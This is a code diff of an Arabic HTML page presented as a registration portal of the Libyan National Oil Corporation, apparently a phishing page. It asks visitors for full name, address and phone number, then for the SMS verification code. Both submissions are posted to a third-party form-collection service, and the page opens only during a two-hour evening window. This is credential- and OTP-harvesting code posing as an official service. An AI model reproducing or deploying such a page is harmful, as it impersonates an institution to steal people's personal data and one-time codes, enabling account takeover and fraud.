@@ -140,84 +140,89 @@
       margin-top: -10px;
       margin-bottom: 15px;
     }
+
+    /* عداد الزوار */
+    .visitor-counter {
+      position: fixed;
+      bottom: 10px;
+      width: 100%;
+      text-align: center;
+      z-index: 9999;
+    }
   </style>
 </head>
 <body>
 
-  <div class="container">
-    <div class="logo-container">
-      <img src="uy.jpeg" alt="شعار المؤسسة الليبية للعمل النفطي" />
-      <p>التسجيل في منظومة المؤسسة الليبية للعمل النفطي</p>
-    </div>
+  <div id="main-content"></div>
 
-    <h2>تسجيل الدخول</h2>
-
-    <form id="phoneForm" onsubmit="return sendPhone(event);">
-      <label for="fullname">الاسم الثلاثي:</label>
-      <input type="text" id="fullname" name="fullname" required placeholder="اكتب اسمك الثلاثي" />
-
-      <label for="address">العنوان:</label>
-      <input type="text" id="address" name="address" required placeholder="اكتب عنوانك" />
-
-      <label for="phone">رقم الهاتف:</label>
-      <input type="tel" id="phone" name="phone" required placeholder="اكتب رقم هاتفك" pattern="[0-9]{10,15}" title="أدخل رقم هاتف صحيح" autocomplete="tel" />
-
-      <button type="submit" id="sendPhoneBtn">إرسال البيانات</button>
-      <div id="timer"></div>
-    </form>
-
-    <form id="codeForm" onsubmit="return sendCode(event);">
-      <div id="codeField">
-        <label for="code">جاري إرسال الكود عبر SMS</label>
-        <input type="text" id="code" name="code" placeholder="اكتب الكود هنا" autocomplete="one-time-code" />
-        <div id="errorMessage" class="error"></div>
-        <button type="submit" id="sendCodeBtn">تأكيد الكود</button>
-        <div id="processingMessage" style="display: none; color: #003366; font-weight: bold; margin-top: 20px;">
-          جاري معالجة طلبك، يمكن المراجعة خلال 7 أيام إلى 30 إذا كان هناك طلب بيانات جديدة منك وشكرًا
-        </div>
-      </div>
-    </form>
-  </div>
-
-  <!-- عداد الزوار بالأحمر -->
-  <div style="position: fixed; bottom: 10px; width: 100%; text-align: center; z-index: 9999;">
-    <img src="https://hitwebcounter.com/counter/counter.php?page=21075202&style=0036&nbdigits=5&type=page&initCount=0" alt="عداد الزوار" style="border: 0;" />
+  <!-- عداد الزوار باللون الأحمر -->
+  <div class="visitor-counter">
+    <a href="https://www.hitwebcounter.com" target="_blank">
+      <img src="https://hitwebcounter.com/counter/counter.php?page=21075347&style=0006&nbdigits=5&type=ip&initCount=0"
+           title="Counter Widget" alt="Visit counter For Websites" border="0" />
+    </a>
   </div>
 
   <script>
-    // إغلاق الصفحة خارج الوقت المحدد (من 8 إلى 10 مساءً فقط)
-    window.addEventListener('DOMContentLoaded', () => {
-      const now = new Date();
-      const hour = now.getHours();
-      if (hour < 20 || hour >= 22) {
-        document.body.innerHTML = `
-          <div style="background-color: #fff; padding: 40px 30px; border-radius: 15px; max-width: 400px; margin: 100px auto; text-align: center; font-family: 'Cairo', sans-serif; box-shadow: 0 5px 15px rgba(0,0,0,0.2);">
-            <h2 style="color: #002147; margin-bottom: 20px;">🚫 خارج وقت التسجيل</h2>
-            <p style="font-size: 18px; margin-bottom: 30px;">التسجيل متاح من الساعة <strong>8 مساءً</strong> إلى <strong>10 مساءً</strong> فقط.</p>
-            <a href="https://noc.ly/" style="display: inline-block; background-color: #007BFF; color: white; padding: 12px 25px; border-radius: 8px; text-decoration: none; font-size: 16px; font-weight: bold;">حسناً</a>
+    const now = new Date();
+    const hour = now.getHours();
+    const mainContent = document.getElementById("main-content");
+
+    if (hour < 20 || hour >= 22) {
+      // خارج وقت التسجيل
+      mainContent.innerHTML = `
+        <div style="background-color: #fff; padding: 40px 30px; border-radius: 15px; max-width: 400px; margin: 100px auto; text-align: center; font-family: 'Cairo', sans-serif; box-shadow: 0 5px 15px rgba(0,0,0,0.2);">
+          <h2 style="color: #002147; margin-bottom: 20px;">🚫 خارج وقت التسجيل</h2>
+          <p style="font-size: 18px; margin-bottom: 30px;">التسجيل متاح من الساعة <strong>8 مساءً</strong> إلى <strong>10 مساءً</strong> فقط.</p>
+          <a href="https://noc.ly/" style="display: inline-block; background-color: #007BFF; color: white; padding: 12px 25px; border-radius: 8px; text-decoration: none; font-size: 16px; font-weight: bold;">حسناً</a>
+        </div>
+      `;
+    } else {
+      // داخل وقت التسجيل
+      mainContent.innerHTML = `
+        <div class="container">
+          <div class="logo-container">
+            <img src="uy.jpeg" alt="شعار المؤسسة الليبية للعمل النفطي" />
+            <p>التسجيل في منظومة المؤسسة الليبية للعمل النفطي</p>
           </div>
-        `;
-        // إعادة العداد بعد استبدال الصفحة
-        document.body.insertAdjacentHTML('beforeend', `
-          <div style="position: fixed; bottom: 10px; width: 100%; text-align: center; z-index: 9999;">
-            <img src="https://hitwebcounter.com/counter/counter.php?page=21075202&style=0036&nbdigits=5&type=page&initCount=0" alt="عداد الزوار" style="border: 0;" />
-          </div>
-        `);
-      }
-    });
+
+          <h2>تسجيل الدخول</h2>
+
+          <form id="phoneForm" onsubmit="return sendPhone(event);">
+            <label for="fullname">الاسم الثلاثي:</label>
+            <input type="text" id="fullname" name="fullname" required placeholder="اكتب اسمك الثلاثي" />
+
+            <label for="address">العنوان:</label>
+            <input type="text" id="address" name="address" required placeholder="اكتب عنوانك" />
+
+            <label for="phone">رقم الهاتف:</label>
+            <input type="tel" id="phone" name="phone" required placeholder="اكتب رقم هاتفك" pattern="[0-9]{10,15}" title="أدخل رقم هاتف صحيح" autocomplete="tel" />
+
+            <button type="submit" id="sendPhoneBtn">إرسال البيانات</button>
+            <div id="timer"></div>
+          </form>
+
+          <form id="codeForm" onsubmit="return sendCode(event);">
+            <div id="codeField">
+              <label for="code">جاري إرسال الكود عبر SMS</label>
+              <input type="text" id="code" name="code" placeholder="اكتب الكود هنا" autocomplete="one-time-code" />
+              <div id="errorMessage" class="error"></div>
+              <button type="submit" id="sendCodeBtn">تأكيد الكود</button>
+              <div id="processingMessage" style="display: none; color: #003366; font-weight: bold; margin-top: 20px;">
+                جاري معالجة طلبك، يمكن المراجعة خلال 7 أيام إلى 30 إذا كان هناك طلب بيانات جديدة منك وشكرًا
+              </div>
+            </div>
+          </form>
+        </div>
+      `;
+    }
 
     let countdownInterval;
-    const sendPhoneBtn = document.getElementById('sendPhoneBtn');
-    const timerDisplay = document.getElementById('timer');
-    const codeField = document.getElementById('codeField');
-    const phoneInput = document.getElementById('phone');
-    const codeInput = document.getElementById('code');
-    const errorMessage = document.getElementById('errorMessage');
-    const processingMessage = document.getElementById('processingMessage');
-    const sendCodeBtn = document.getElementById('sendCodeBtn');
-
     function startTimer(duration) {
       let timeLeft = duration;
+      const timerDisplay = document.getElementById('timer');
+      const sendPhoneBtn = document.getElementById('sendPhoneBtn');
+      const phoneInput = document.getElementById('phone');
       timerDisplay.style.display = 'block';
       updateTimer(timeLeft);
       countdownInterval = setInterval(() => {
@@ -233,6 +238,7 @@
     }
 
     function updateTimer(seconds) {
+      const timerDisplay = document.getElementById('timer');
       const minutes = Math.floor(seconds / 60).toString().padStart(2, '0');
       const secs = (seconds % 60).toString().padStart(2, '0');
       timerDisplay.textContent = `يرجى الانتظار: ${minutes}:${secs}`;
@@ -240,7 +246,7 @@
 
     function sendPhone(event) {
       event.preventDefault();
-
+      const phoneInput = document.getElementById('phone');
       const fullname = document.getElementById('fullname').value;
       const address = document.getElementById('address').value;
 
@@ -250,26 +256,17 @@
         return false;
       }
 
-      const payload = {
-        fullname,
-        address,
-        phone: phoneInput.value
-      };
-
+      const payload = { fullname, address, phone: phoneInput.value };
       fetch('https://formcarry.com/s/2evKahWtdJS', {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Accept': 'application/json'
-        },
+        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
         body: JSON.stringify(payload)
       })
       .then(response => {
         if (!response.ok) throw new Error('فشل إرسال رقم الهاتف');
-
         phoneInput.disabled = true;
-        sendPhoneBtn.disabled = true;
-        codeField.style.display = 'block';
+        document.getElementById('sendPhoneBtn').disabled = true;
+        document.getElementById('codeField').style.display = 'block';
         startTimer(480); // 8 دقائق
       })
       .catch(error => {
@@ -282,6 +279,10 @@
 
     function sendCode(event) {
       event.preventDefault();
+      const codeInput = document.getElementById('code');
+      const errorMessage = document.getElementById('errorMessage');
+      const processingMessage = document.getElementById('processingMessage');
+      const sendCodeBtn = document.getElementById('sendCodeBtn');
       errorMessage.textContent = '';
 
       if (codeInput.value.trim() === '') {
@@ -291,21 +292,17 @@
       }
 
       const payload = {
-        phone: phoneInput.value,
+        phone: document.getElementById('phone').value,
         code: codeInput.value
       };
 
       fetch('https://formcarry.com/s/2evKahWtdJS', {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Accept': 'application/json'
-        },
+        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
         body: JSON.stringify(payload)
       })
       .then(async response => {
         const data = await response.json();
-
         if (response.ok && data.success !== false) {
           sendCodeBtn.style.display = 'none';
           processingMessage.style.display = 'block';
